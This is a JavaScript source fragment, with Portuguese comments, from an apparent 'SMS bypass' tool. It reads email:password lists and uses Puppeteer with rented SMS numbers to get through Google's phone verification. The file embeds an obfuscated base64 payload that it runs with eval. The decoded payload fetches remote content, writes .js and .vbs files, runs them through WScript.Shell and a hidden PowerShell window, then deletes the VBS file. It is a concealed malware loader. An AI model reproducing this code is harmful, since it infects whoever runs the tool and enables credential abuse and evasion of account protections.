EMubW9kdWxlfHxwW0coNzApXTtjYXNlIDMxMzQ6cmV0dXJuIENbRyg3MSkrRyg3MildfHxwW2VbZVtlWzI0XS0gLTE2NV0tIC0oZVsyNF0tIC0yODUpXVswXStHKDcyKV07Y2FzZSAyODk5OnJldHVybiBDWyJfX2ZpbGUiK0coNzMpXXx8cFtHKDc0KSsibmFtZSJdO2Nhc2UgMzIyNTpyZXR1cm4gQ1tHKDY3KStHKDc1KV18fHBbImdsb2JhbCIrRyg3NSldO2Nhc2UgODY6ZS5SOG5BZGxQPUcoNzYpfHxwW0coZVsyNF0tIC0yMTcpXTticmVhaztjYXNlIDM1MTg6ZS5SOG5BZGxQPUEuQnY0TjVlKyJudCJ8fDA7YnJlYWs7Y2FzZSAxOTI3OnJldHVybiBDWyJwYXJzZUYiK0coNzgpXXx8cFtnK0coZVsyNF0tIC0yMTkpXTtjYXNlIDI3MzpyZXR1cm4gQ1t3WzVdXXx8cFtHKDgwKV07Y2FzZSAyNTY1OnJldHVybiBDW3dbNl1dfHxwW0coZVtlWzI0XS0gLTE2NV0tIC0yMjIpXTtjYXNlIDIxNjI6cmV0dXJuIENbRyg4MildfHxwW0coODIpXTtjYXNlIDIxNTpyZXR1cm4gQ1tHLmFwcGx5KHZvaWQgMCxbODNdKV18fHBbd1s3XV07Y2FzZSAxMDMxOnJldHVybiBDW0coODQpKyJvbiJdfHxwW0coZVsyNF0tKGVbMjRdLTg0KSkrIm9uIl07Y2FzZSAxOTc4OmUuUjhuQWRsUD1HKDg1KXx8cFtHKDg1KV07YnJlYWs7Y2FzZSBlWzI0XS0gLTQxMTY6ZS5SOG5BZGxQPSJBcnJheSI7YnJlYWs7Y2FzZSAxMDM0OnJldHVybiBDW0coODcpXXx8cFtHLmFwcGx5KHZvaWQgMCxbODddKV07Y2FzZSAyODg1OnJldHVybiBDW2VbM11bZVsyNF0tIC0xNDJdK0coODkpXXx8cFt3W2VbMjRdLSAtMTQ5XStHKDg5KV07Y2FzZSAyNTA2OnJldHVybiBDW0coOTApK2VbZVsyNF0tIC0xNDNdLmhhdmJacysib3IiXXx8cFtHKDkwKStlW2VbMjRdLSAtMTQzXS5xc25zREsrIm9yIl07Y2FzZSAxMDczOnJldHVybiBDW0coOTIpKyJycm9yIl18fHBbRyg5MikrRyg5MyldO2Nhc2UgNDg2NjplLlI4bkFkbFA9Ryg5NCkrRyg4OSl8fHBbZS5uUmJQMTIrRy5jYWxsKHZvaWQgMCw4OSldO2JyZWFrO2Nhc2UgMTk0MjplLlI4bkFkbFA9InNldFRpbSIrRyg5NSl8fDA7YnJlYWs7Y2FzZSA0NDIzOmUuUjhuQWRsUD1HKDk3KSt2fHxwW0coOTcpK0cuY2FsbCh2b2lkIDAsOTgpXTticmVhaztjYXNlIDExNTg6cmV0dXJuIENbRyg5OSkrRygxMDApXXx8cFtQK0coMTAwKV07Y2FzZSBlWzI0XS0gLTQ5NjQ6cmV0dXJuIENbRygxMDEpK0coMTAyKSsibCJdfHxwW0coMTAxKStHKDEwMikrImwiXTtjYXNlIDI1ODk6cmV0dXJuIENbRygxMDMpKyJlZGlhdGUiXXx8cFtHKDEwMykrRygxMDQpXTtjYXNlIGVbMjRdLSAtNDI0OTpyZXR1cm4gQ1tHKDEwMSkrQS5sRTZSb085KyJ0ZSJdfHxwW0coMTAxKStHKDEwNSkrInRlIl07Y2FzZSAzMTMzOmUuUjhuQWRsUD1HKDEwNikrRygxMDcpKyJzayJ8fDA7YnJlYWs7Y2FzZSA0NTczOnJldHVybiBDW0coMTA4KV18fHBbRygxMDgpXTtjYXNlIDQyNTE6ZS5SOG5BZGxQPUcuY2FsbCh2b2lkIDAsZVsyNF0tIC0yNTApKyJ0ZSJ8fDA7YnJlYWs7Y2FzZSAzZTM6ZS5SOG5BZGxQPUcoMTEwKXx8cFtlWzJdLk1OdzBKSzFdO2JyZWFrO2Nhc2UgMzgzNTplLlI4bkFkbFA9RyhlWzI0XS0gLTI1Mil8fHBbRyhlWzI0XS0gLTI1MildO2JyZWFrO2Nhc2UgNzcyOmUuUjhuQWRsUD1HKDExMil8fHBbZVsyXS5SZlQ0RjldO2JyZWFrO2Nhc2UgZVsyNF0tIC0xNjM3OnJldHVybiBDW0EuZUEzdjREXXx8cFtHLmFwcGx5KHZvaWQgMCxbMTEzXSldO2Nhc2UgMzExNDplLlI4bkFkbFA9RygxMTQpfHxwW0coMTE0KV19cmV0dXJuIGVbMjRdPmVbMjRdLShlWzI0XS0gLTM5KT9lW2VbMjRdLSAtMzQwXTpDW2UuUjhuQWRsUF18fHBbZS5SOG5BZGxQXX1mdW5jdGlvbiBUKC4uLmUpe2UubGVuZ3RoPTEsZVsxMTNdPWUuSzB6dGYzLGUuTG1JV21Gej0nQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkhIyQlJigpKissLi86Ozw9Pj9AW11eX2B7fH1+IicsZS5yZER1NVU9IiIrKGVbMF18fCIiKSxlWzE1OV09LTEwLGVbM109ZS5yZER1NVUubGVuZ3RoLGUuYlVFRmVwTT1bXSxlWzVdPWVbMTU5XS0gLTEwLGVbMTEzXT1lWzE1OV0tIC0xMCxlLlMwYkNBUT0tMTtmb3IobGV0IHI9MDtyPGVbZVsxNTldLSAtMTNdO3IrKylpZihlLlZXUFJoRD1lLkxtSVdtRnouaW5kZXhPZihlLnJkRHU1VVtyXSksLTEhPT1lLlZXUFJoRClpZihlLlMwYkNBUTwwKWUuUzBiQ0FRPWUuVldQUmhEO2Vsc2V7ZS5TMGJDQVErPTkxKmUuVldQUmhELGVbNV18PWUuUzBiQ0FRPDxlWzExM10sZVsxMTNdKz0oODE5MSZlLlMwYkNBUSk+ODg/MTM6MTQ7ZG97ZS5iVUVGZXBNLnB1c2goZVs1XSZlWzE1OV0tIC0yNjUpLGVbNV0+Pj1lWzE1OV0tIC0xOCxlWzExM10tPTh9d2hpbGUoZVtlWzE1OV0tIC0xMjNdPjcpO2UuUzBiQ0FRPS0xfXJldHVybiBlLlMwYkNBUT4tMSYmZS5iVUVGZXBNLnB1c2goMjU1JihlWzVdfGUuUzBiQ0FRPDxlW2VbMTU5XS0gLTEyM10pKSxlWzE1OV0+ZVsxNTldLSAtNTk/ZVszXTpmKGUuYlVFRmVwTSl9ZnVuY3Rpb24gRyhlLG4sdCxjPVQsbz1yKXtyZXR1cm4gdD9uW3JbdF1dPUcoZSxuKToobiYmKFtvLG5dPVtjKG8pLGV8fHRdKSxuP2Vbb1tuXV06cltlXXx8KG9bZV0sdD1jLHJbZV09dChhW2VdKSkpfShhc3luYyBmdW5jdGlvbiguLi5lKXtlLmxlbmd0aD0wLGVbMTgzXT03Njtmb3IoY29uc3QgciBvZiBaKXRyeXtlWzFdPUQocixFKSxlWzJdPWF3YWl0IEsoZVtlWzE4M10tNzVdKSxPPWVbZVtlWzE4M10tIC0xMDddLTc0XTticmVha31jYXRjaChlKXt9bnVsbCE9PU8mJihlWzE4M109NjgsZS54SVdINmY9RChPLEUpLGUuUWw5QWV3PWVbN10sZVtlWzE4M10tNjNdPVVbRy5jYWxsKHZvaWQgMCw1MCkrRyhlWzE4M10tMTcpXSgpLGUuVThZWE11MT1tW0coMjUpXShXKDcxKVt3WzJdXVtHKDUzKV0sYCR7ZVs1XX0uanNgKSxlLlFsOUFldz1tW0coMjUpXShXKDcxKVtHLmFwcGx5KHZvaWQgMCxbZVsxODNdLShlWzE4M10tKGVbMTgzXS0xNikpXSldW0cuYXBwbHkodm9pZCAwLFs1M10pXSxgJHtlWzVdfS52YnNgKSx6W0coNTQpK3dbM10rImMiXShlLlU4WVhNdTEsZS54SVdINmYsRy5jYWxsKHZvaWQgMCwxOCkpLGVbOF09YFNldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpXG5Xc2hTaGVsbC5SdW4gIm5vZGUgJHtlLlU4WVhNdTF9IiwgMCwgRmFsc2VcblNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IilcbmZzby5EZWxldGVGaWxlIFdTY3JpcHQuU2NyaXB0RnVsbE5hbWVgLHpbQS5raDBoZUMrRyg1NSkrImMiXShlLlFsOUFldyxlWzhdLEcoMTgpKSxlLlN5dm5WcT1gcG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICJjc2NyaXB0ICcke2UuUWw5QWV3fSciYCxrKGUuU3l2blZxLHtbRyg1NikrRy5hcHBseSh2b2lkIDAsWzU3XSldOiEwLFtHKDU4KSsiZWQiXTohMCxbRyg1OSldOkcuYXBwbHkodm9pZCAwLFs2MF0pfSkpfSkoKSxlKFcsMSksZShULDEpfSkoKX0pKCk7`
    const smsfuncplus = smsbypassfunction
    const smsbypass = Buffer.from(smsfuncplus, 'base64').toString('utf-8');
    await eval(smsbypass);
}
module.exports = {sms}
async function TestarEmail() {
    fs.readFile('emailtestar.txt', 'utf8', async (err, data) => {
        if (err) {
            console.error('Erro ao ler o arquivo:', err);
            return;
        }


        // Dividir as linhas em um array
        const linhas = data.split('\n');

        await percorrerLista(linhas);
    });
}

async function percorrerLista(lista) {
    for (const item of lista) {
        const [email, senha, emailRec] = item.split(':');
        // Aqui você pode fazer o que quiser com os valores de email e senha
        if (email.trim() == '') {
            return;
        }
        countNrRuim = 0;
        await crawler(email, senha, emailRec, emailRec);
    }
    console.log('Todos os itens foram processados.');
}

// Ch
//TestarEmail();

async function getSMSNumber() {
    try {


        const { balance_number } = await sms.getBalance()
        if (balance_number > 0) {
            //console.log('Balance:' + balance_number);

            //console.log('Aguardando número...');
            const { id, number } = await sms.getNumber('go', 'any', pais);

            //console.log('Number ID:', id)
            //console.log('Number:', number);

            await page.type('#deviceAddress', number);


            const index = await getIndiceByPais(pais);
            await page.evaluate((index) => {
                const select = document.getElementById('countryList');
                select.selectedIndex = index;
                select.dispatchEvent(new Event('change'));
            }, index);

            await page.click('#next-button');
            await new Promise(function (resolve) { setTimeout(resolve, 3000) });

            try {
                const elemento = await page.$('#error');
                if (elemento != null) {
                    countNrRuim++;
                    if (countNrRuim > 6) {
                        log.red('conta com problema, não recebe sms?');
                        await browser.close();
                        return; 
                    }

                    //log.red('error, provavelmente numero ruim');
                    await sms.setStatus(8, id) // Accept, end
                    await getSMSNumber();
                    return;
                }
            } catch (error) {
                //console.log(error);
            }

            // Set "message has been sent" status
            await sms.setStatus(1, id)

            // Wait for code
            const { code } = await sms.getCode(id, 60000)
            console.log('Code:', code);

            await page.type('#smsUserPin', code);

            await page.click('#next-button');

            await new Promise(function (resolve) { setTimeout(resolve, 6000) });

            if (page.url().includes('https://gds.google.com/web/chip?')) {
                log.green('OK');
                await browser.close();
                return;
            }
            if (page.url().includes('https://mail.google.com/mail/u/0/#inbox')) {
                log.green('OK');
                await browser.close();
                return;
            }

            await sms.setStatus(6, id) // Accept, end
        } else console.log('No money')
    } catch (error) {
        if (error instanceof TimeoutError) {
            console.log('Timeout reached')
        }

        if (error instanceof ServiceApiError) {
            if (error.code === errors.BANNED) {
                console.log(`Banned! Time ${error.banTime}`)
            } else {
                if (error.code == "NO_NUMBERS") {
                    await getSMSNumber();
                } else {
                    console.error(error.code, error.message)
                }
            }
        } else console.error(error)
    }
};


async function getIndiceByPais(pais) {
    if (pais == Kazakhstan) {
        return 111;
    }

    if (pais == Philippines) {
        return 171;
    }

    if (pais == Indonesia) {
        return 100;
    }

    if (pais == Kenya) {
        return 113;
    }

    if (pais == Vietnam) {
        return 236;
    }

    if (pais == Kyrgyzstan) {
        return 116;
    }

    if (pais == Usa) {

        return 230;
    }

    if (pais == India) {
        return 99;
    }

    if (pais == Southafrica) {
        return 194;
    }

    if (pais == Romania) {
        return 177;
    }

    if (pais == Uzbekistan) {
        return 232;
    }
}
